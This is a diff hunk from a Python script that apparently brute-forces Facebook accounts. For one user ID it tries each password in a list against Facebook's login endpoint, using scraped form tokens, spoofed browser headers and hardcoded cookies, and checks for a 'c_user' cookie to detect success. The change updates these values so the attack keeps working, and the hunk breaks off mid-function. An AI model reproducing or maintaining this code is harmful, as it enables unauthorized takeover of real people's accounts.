@@ -1319,55 +1319,55 @@ def p(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            free_fb = Session.get('https://m.facebook.com').text
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'timezone': '465',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '000740_z24_',
-            'lgnjs': '1754329806',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAA',
-            'locale': 'en_GB',
-            'login_source': 'login_bluebar',
-            'guid': 'f69cef19e8c092d36',
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_onload',
-            'prefill_type': 'contact_point',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+        'email': uid,
+        'timezone': '-330',
+        'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+        'lgnrnd': '060331_lb2E',
+        'lgnjs': '1751375011',
+        'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
+        'locale': 'hi_IN',
+        'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
+        'guid': 'f13465d1007fbcb28',
+        'prefill_contact_point': '',
+        'prefill_source': 'browser_dropdown',
+        'prefill_type': 'password',
+        'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'ps_l': '1',
-            'ps_n': '1',
-            'locale': 'en_GB',
-            'fr': '0kecLpkCSsNxxvFQX..Bok8Vd..AAA.0.0.BolFGj.AWdKAl3AmarOx1L26X4XwwjAlIA',
-            'wd': '1189x773',
-            'sb': 'XcWTaN3TYwsXBZrl1HmGrVxE',
-            'datr': 'XcWTaGN0ZGmUFCDpTlDzOXEf',}
+        'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
+        'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
+        'ps_l': '1',
+        'ps_n': '1',
+        'locale': 'hi_IN',
+        'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
+        'wd': '885x751',}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/lin/web/?cuid=AYidMAhjde4lWBm_k7Y0bMTJaFEg0_w4AnBh5ADIYXxLxtAppRO_lxiss0gIgmkwWuA0JANE5PXGqW0Mgwq2q7gpZNfrgGZPXwQlgd1SBPbS-Q&e=1348131',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="8.0.0.0", "Chromium";v="138.0.7204.184", "Google Chrome";v="138.0.7204.184"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
-            'viewport-width': '1189',}
-            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
+        'authority': 'www.facebook.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'dpr': '1',
+        'origin': 'https://www.facebook.com',
+        'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
+        'sec-ch-prefers-color-scheme': 'dark',
+        'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
+        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-model': '""',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-ch-ua-platform-version': '"10.0.0"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+        'viewport-width': '885',}
+            url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
